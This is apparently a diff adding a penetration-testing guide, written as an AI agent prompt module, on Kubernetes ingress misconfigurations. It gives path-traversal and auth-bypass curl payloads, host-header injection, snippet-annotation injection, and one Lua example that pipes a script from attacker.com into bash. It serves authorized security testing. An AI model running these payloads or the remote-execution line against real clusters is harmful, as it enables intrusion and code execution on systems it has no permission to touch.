@@ -1,0 +1,447 @@
+<ingress_misconfig_guide>
+<title>KUBERNETES INGRESS MISCONFIGURATIONS</title>
+
+<critical>Ingress controller misconfigurations enable attackers to bypass security controls, access internal services, exploit path traversal, inject malicious configurations, or intercept traffic. As the entry point to cluster services, a compromised ingress can expose the entire application layer to attacks.</critical>
+
+<scope>
+- Path confusion: Path traversal, normalization bypass, routing exploits
+- Annotation injection: Malicious snippets in ingress annotations
+- TLS termination issues: Missing TLS, weak ciphers, certificate exposure
+- Backend access: Direct access to services bypassing ingress controls
+- Default backend exposure: Sensitive info in default/error responses
+- Controller vulnerabilities: Known CVEs in ingress controllers
+- Host header attacks: Routing manipulation via Host header
+- WAF/auth bypass: Circumventing protection via path manipulation
+</scope>
+
+<methodology>
+1. Identify ingress controllers and their types (nginx, traefik, HAProxy, etc.).
+2. List all ingress resources and their configurations.
+3. Test path handling: normalization, traversal, special characters.
+4. Check annotation security: snippet injection possibilities.
+5. Verify TLS configuration and certificate validity.
+6. Test for direct backend access bypassing ingress.
+7. Document misconfigurations with exploitation scenarios.
+</methodology>
+
+<discovery_techniques>
+<identify_ingress>
+Find ingress controllers:
+```bash
+# List ingress controllers
+kubectl get pods -n ingress-nginx
+kubectl get pods -n kube-system | grep -E "ingress|nginx|traefik|haproxy"
+
+# Check ingress controller version (for CVE checking)
+kubectl get deployment -n ingress-nginx ingress-nginx-controller -o jsonpath='{.spec.template.spec.containers[0].image}'
+
+# List all ingress resources
+kubectl get ingress --all-namespaces
+```
+
+Identify controller type from headers:
+```bash
+curl -v https://target.com 2>&1 | grep -i server
+# Server: nginx/1.19.0
+# Server: Traefik
+```
+</identify_ingress>
+
+<analyze_ingress_config>
+Review ingress resources:
+```bash
+# Get ingress YAML
+kubectl get ingress myingress -o yaml
+
+# Look for dangerous annotations
+kubectl get ingress --all-namespaces -o yaml | grep -E "snippet|configuration-snippet|server-snippet|lua"
+```
+
+Dangerous annotations:
+```yaml
+# nginx-ingress snippet injection
+nginx.ingress.kubernetes.io/configuration-snippet: |
+  # Could inject arbitrary nginx config
+nginx.ingress.kubernetes.io/server-snippet: |
+  # Server-level injection
+nginx.ingress.kubernetes.io/auth-snippet: |
+  # Auth bypass potential
+```
+</analyze_ingress_config>
+
+<path_testing>
+Path normalization tests:
+```bash
+# Path traversal attempts
+curl https://target.com/../admin
+curl https://target.com/..%2fadmin
+curl https://target.com/..;/admin
+curl https://target.com/%2e%2e/admin
+
+# URL encoding variations
+curl https://target.com/..%252fadmin  # Double encoding
+curl https://target.com/..%c0%af/admin  # Overlong UTF-8
+curl https://target.com/.%00./admin  # Null byte
+
+# Case confusion
+curl https://target.com/Admin vs /admin
+
+# Trailing slash
+curl https://target.com/api/users vs /api/users/
+```
+
+Path confusion for auth bypass:
+```bash
+# If /admin requires auth, try:
+curl https://target.com/ADMIN
+curl https://target.com/admin/
+curl https://target.com//admin
+curl https://target.com/./admin
+curl https://target.com/admin%00
+curl https://target.com/admin;
+```
+</path_testing>
+
+<tls_analysis>
+Check TLS configuration:
+```bash
+# Test TLS version and ciphers
+nmap --script ssl-enum-ciphers -p 443 target.com
+testssl.sh target.com
+
+# Check certificate
+openssl s_client -connect target.com:443 </dev/null 2>/dev/null | openssl x509 -text
+
+# Check for TLS termination issues
+# If internal traffic is unencrypted after ingress
+curl http://internal-service.namespace.svc.cluster.local
+```
+
+Look for:
+- TLS 1.0/1.1 enabled
+- Weak ciphers (RC4, DES, NULL)
+- Expired certificates
+- Self-signed in production
+- Certificate for wrong domain
+</tls_analysis>
+
+<backend_direct_access>
+Test if services accessible directly:
+```bash
+# If you can resolve cluster DNS or have pod access
+curl http://backend-service.namespace.svc.cluster.local:8080
+
+# Check for NodePort exposure
+kubectl get svc --all-namespaces | grep NodePort
+curl http://node-ip:nodeport
+
+# Check for LoadBalancer services (may bypass ingress)
+kubectl get svc --all-namespaces | grep LoadBalancer
+```
+</backend_direct_access>
+</discovery_techniques>
+
+<vulnerability_types>
+<path_traversal>
+Nginx ingress path traversal (CVE-2021-25745 and similar):
+```
+# Merge slashes can cause issues
+location /app {
+    proxy_pass http://backend/;
+}
+# Request: /app../admin
+# May reach: http://backend/../admin = http://backend/admin
+```
+
+Testing:
+```bash
+# Try various traversal payloads
+for payload in "../" "..%2f" "%2e%2e/" "..;" "%2e%2e%2f"; do
+    curl "https://target.com/api/$payload" -v
+done
+```
+</path_traversal>
+
+<annotation_injection>
+Injecting nginx config via annotations:
+```yaml
+# If attacker can modify ingress resource
+apiVersion: networking.k8s.io/v1
+kind: Ingress
+metadata:
+  annotations:
+    nginx.ingress.kubernetes.io/configuration-snippet: |
+      proxy_set_header X-Admin "true";
+```
+
+RCE via Lua (older versions):
+```yaml
+nginx.ingress.kubernetes.io/configuration-snippet: |
+  access_by_lua_block {
+    os.execute("curl http://attacker.com/shell.sh | bash")
+  }
+```
+
+This requires ability to create/modify Ingress resources.
+</annotation_injection>
+
+<host_header_injection>
+Manipulating routing via Host header:
+```bash
+# Access internal service via host manipulation
+curl https://external-ip -H "Host: internal-service.local"
+curl https://external-ip -H "Host: admin.target.com"
+
+# Multiple host headers
+curl https://target.com -H "Host: evil.com" -H "Host: target.com"
+```
+
+Impact:
+- Access unintended backends
+- Cache poisoning
+- Password reset poisoning
+</host_header_injection>
+
+<auth_bypass_via_path>
+Bypassing ingress-level auth:
+```bash
+# If /admin is protected
+# Try path variations
+curl https://target.com/admin        # 401
+curl https://target.com/Admin        # 200?
+curl https://target.com/admin/       # 200?
+curl https://target.com/admin;       # 200?
+curl https://target.com/ADMIN%00     # 200?
+curl https://target.com//admin       # 200?
+```
+
+Annotation auth bypass:
+```yaml
+# Auth only on specific paths
+nginx.ingress.kubernetes.io/auth-url: "http://auth-service/validate"
+# May not apply to paths not matching ingress rules
+```
+</auth_bypass_via_path>
+
+<default_backend_exposure>
+Information disclosure from default backend:
+```bash
+# Request non-existent path
+curl https://target.com/nonexistent_path_xyz
+
+# May reveal:
+# - Server version
+# - Internal hostnames
+# - Stack traces
+# - Configuration details
+```
+</default_backend_exposure>
+
+<controller_cves>
+Known vulnerabilities by controller:
+- nginx-ingress: CVE-2021-25745, CVE-2021-25746 (path traversal, snippet injection)
+- Traefik: CVE-2022-23632 (path traversal)
+- HAProxy: Various auth bypass CVEs
+
+Check version:
+```bash
+kubectl get deployment -n ingress-nginx ingress-nginx-controller \
+  -o jsonpath='{.spec.template.spec.containers[0].image}'
+# Compare against CVE databases
+```
+</controller_cves>
+</vulnerability_types>
+
+<exploitation>
+<path_traversal_exploit>
+Accessing admin panel via path traversal:
+1. Normal request blocked:
+   ```bash
+   curl https://target.com/admin
+   # 403 Forbidden or 401 Unauthorized
+   ```
+2. Traversal bypass:
+   ```bash
+   curl https://target.com/api/../admin
+   # 200 OK - Admin panel accessed
+   ```
+3. Document the bypass mechanism
+
+Evidence:
+- Request with traversal payload
+- Response showing unauthorized access
+- Comparison with blocked direct access
+</path_traversal_exploit>
+
+<snippet_injection_exploit>
+Exploiting annotation injection (requires RBAC to create/modify Ingress):
+1. Create malicious ingress:
+   ```yaml
+   apiVersion: networking.k8s.io/v1
+   kind: Ingress
+   metadata:
+     name: malicious
+     annotations:
+       nginx.ingress.kubernetes.io/configuration-snippet: |
+         add_header X-Pwned "true";
+   spec:
+     rules:
+     - host: target.com
+       http:
+         paths:
+         - path: /
+           pathType: Prefix
+           backend:
+             service:
+               name: backend
+               port:
+                 number: 80
+   ```
+2. Verify injection:
+   ```bash
+   curl -I https://target.com
+   # X-Pwned: true
+   ```
+</snippet_injection_exploit>
+
+<host_header_exploit>
+Accessing internal service:
+```bash
+# External ingress listens on 443
+# Internal service mapped to different host
+
+curl -k https://external-ip:443 -H "Host: internal-admin.cluster.local"
+# May route to internal admin service
+```
+</host_header_exploit>
+</exploitation>
+
+<validation>
+1. Demonstrate actual bypass or unauthorized access, not just configuration observation.
+2. For path traversal: Show access to resource that should be blocked.
+3. For annotation injection: Show modified behavior (requires RBAC access to ingress).
+4. Verify findings work through actual ingress, not direct backend access.
+5. Check controller version against known CVEs.
+6. Document the specific ingress controller and version.
+7. Consider if finding requires special permissions (e.g., ingress write).
+</validation>
+
+<false_positives>
+- Path variations that don't actually bypass controls
+- Annotations that are sanitized by controller
+- Backend access via intended routes (NodePort, LoadBalancer)
+- TLS warnings for internal-only services
+- Test/development ingress with relaxed security
+- Errors revealing info but only to authenticated users
+</false_positives>
+
+<llm_reasoning_errors>
+COMMON AI MISTAKES THAT CAUSE FALSE POSITIVES - AVOID THESE:
+
+1. PATH WITHOUT TRAVERSAL:
+   WRONG: "Different paths return different content, path confusion vulnerability"
+   RIGHT: Different paths are supposed to return different content:
+          - /api/users vs /api/admin = different endpoints
+          - This is normal routing, not confusion
+          Vulnerability requires accessing UNAUTHORIZED resources.
+
+2. ANNOTATION PRESENT VS INJECTABLE:
+   WRONG: "Ingress uses configuration-snippet, annotation injection possible"
+   RIGHT: Using annotations is normal functionality:
+          - Admin intentionally configured them
+          - Injection requires attacker write access to Ingress
+          - This is RBAC issue, not ingress vulnerability
+          Focus on what ATTACKER can modify.
+
+3. TLS VERSION PARANOIA:
+   WRONG: "TLS 1.2 enabled, should only allow TLS 1.3"
+   RIGHT: TLS 1.2 is still considered secure:
+          - Most clients support TLS 1.2
+          - TLS 1.3-only breaks compatibility
+          - Focus on TLS 1.0/1.1 or weak ciphers
+          Check for actually weak configurations.
+
+4. INTERNAL SERVICE ACCESS:
+   WRONG: "Can access service directly via ClusterIP, ingress bypass"
+   RIGHT: Internal service access is normal from within cluster:
+          - ClusterIP is internal by design
+          - Ingress is for external access
+          - Pod-to-service communication expected
+          Focus on EXTERNAL bypass of ingress.
+
+5. ERROR PAGE DISCLOSURE:
+   WRONG: "404 page shows nginx version, information disclosure"
+   RIGHT: Server version in headers/errors is low severity:
+          - Common, not usually actionable alone
+          - Only significant if specific CVE applies
+          - Focus on sensitive info disclosure
+          Report if combined with known vulnerable version.
+
+6. CERTIFICATE ISSUES:
+   WRONG: "Self-signed certificate, TLS misconfiguration"
+   RIGHT: Context matters for certificate issues:
+          - Internal services may use self-signed
+          - Development environments expected
+          - Production external services should have valid certs
+          Verify this is production-facing service.
+</llm_reasoning_errors>
+
+<expanded_false_positives>
+FALSE POSITIVE SCENARIOS - DO NOT REPORT:
+
+1. NORMAL ROUTING:
+   - Different paths returning different content
+   - Host-based routing working as designed
+   - Load balancing across backends
+
+2. AUTHORIZED ANNOTATION USE:
+   - Admin-configured snippets for legitimate purposes
+   - Custom headers for application requirements
+   - Lua modules for intended functionality
+
+3. ACCEPTABLE TLS:
+   - TLS 1.2 support (still secure)
+   - Internal services with self-signed certs
+   - Development/staging with relaxed TLS
+
+4. INTERNAL ACCESS:
+   - Service-to-service communication in cluster
+   - Backend access from authorized pods
+   - NodePort for cluster administration
+
+5. MINOR INFORMATION DISCLOSURE:
+   - Server version headers (unless CVE-specific)
+   - Generic error messages
+   - Stack traces in development mode
+
+6. RBAC-DEPENDENT ISSUES:
+   - Annotation injection requiring Ingress write access
+   - Issues exploitable only by cluster admins
+   - Configurations modifiable only by authorized users
+</expanded_false_positives>
+
+<impact>
+- Authentication bypass: Access protected resources without credentials
+- Internal service exposure: Reach internal APIs via path manipulation
+- Data interception: TLS issues enable MITM attacks
+- Service disruption: Malicious config crashes ingress
+- Remote code execution: Severe annotation injection or CVE exploitation
+- Cache poisoning: Host header attacks affect CDN/cache
+- Lateral movement: Ingress compromise as pivot point
+</impact>
+
+<pro_tips>
+1. Test path variations systematically: encoding, case, special chars, slashes.
+2. nginx-ingress has had multiple path handling CVEs - check version first.
+3. Annotation security depends on RBAC - who can modify Ingress resources?
+4. Traefik uses different annotation format - adapt testing accordingly.
+5. Check if WAF/CDN in front of ingress may handle some attacks.
+6. Host header routing can expose services not intended for external access.
+7. Default backend often reveals more info than application error pages.
+8. Multiple ingress controllers in cluster may have different security postures.
+9. Ingress with regex paths can have ReDoS vulnerabilities.
+10. Check for canary/shadow deployments that may have different security.
+</pro_tips>
+
+<remember>Ingress misconfigurations require demonstrating actual unauthorized access or bypass, not just observing configuration choices. Path variations that don't access unauthorized resources, annotations configured by admins, and TLS 1.2 support are generally not vulnerabilities. Focus on bypassing authentication, accessing unintended backends, or exploiting known CVEs in specific controller versions.</remember>
+</ingress_misconfig_guide>
